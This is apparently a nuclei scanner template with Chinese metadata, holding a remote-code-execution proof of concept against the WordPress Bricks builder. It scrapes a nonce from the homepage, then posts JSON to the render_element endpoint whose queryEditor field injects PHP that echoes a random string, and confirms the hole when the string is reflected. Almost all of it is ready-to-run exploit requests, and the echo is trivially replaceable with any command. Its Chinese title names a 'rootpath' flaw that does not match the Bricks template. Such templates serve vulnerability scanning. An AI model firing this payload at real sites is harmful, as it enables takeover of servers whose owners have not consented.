script_name: wordpress rootpath 远程命令执行
content:
# Add your nuclei formatted PoC!
id: WordPres-Bricks-render_element-rce

info:
  name: WordPres-Bricks-render_element-rce
  author: WordPres-Bricks-render_element-rce
  severity: Critical

http:
  - raw:
      - |
        GET / HTTP/1.1
        Content-Type: text/html
        Host: {{Hostname}}

      - |
        POST /wp-json/bricks/v1/render_element HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
        Accept: */*
        Content-Type: application/json
         
        {
          "postId": "1",
          "nonce": "{{noncez}}",
          "element": {
            "name": "container",
            "settings": {
              "hasLoop": "true",
              "query": {
                "useQueryEditor": true,
                "queryEditor": "throw new Exception(`echo {{randstr}}`);",
                "objectType": "post"
              }
            }
          }
        }


    extractors:
      - type: regex
        name: noncez
        part: body
        internal: true
        group: 1
        regex:
          - 'nonce":"(.*?)"'

    matchers:
      - type: dsl
        dsl:
          - status_code_2==200 && contains_all(body_2,"{{randstr}}")
help: wordpress rootpath 远程命令执行
author: 蜜汁狗蛋
online_script_name: wordpress rootpath 远程命令执行
